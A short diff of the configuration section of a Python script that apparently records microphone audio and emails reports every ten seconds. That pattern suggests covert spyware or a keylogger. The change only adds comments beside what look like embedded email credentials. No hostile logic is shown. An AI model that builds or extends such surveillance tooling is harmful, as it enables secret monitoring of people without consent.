@@ -15,9 +15,9 @@ from email.mime.audio import MIMEAudio
 import subprocess
 
 # Email configuration
-EMAIL_ADDRESS = "128f1e9719da9b"
-EMAIL_PASSWORD = "1f95ad1055c4e4"
-SEND_REPORT_EVERY = 10  # as in seconds
+EMAIL_ADDRESS = "128f1e9719da9b" #Enter your email here
+EMAIL_PASSWORD = "1f95ad1055c4e4"  #Enter your Password here
+SEND_REPORT_EVERY = 10  
 AUDIO_SAMPLE_RATE = 44100  # Sample rate for audio recording
 AUDIO_CHANNELS = 2  # Number of audio channels
 AUDIO_FILENAME = "microphone_audio.wav"  # Change the filename to .wav
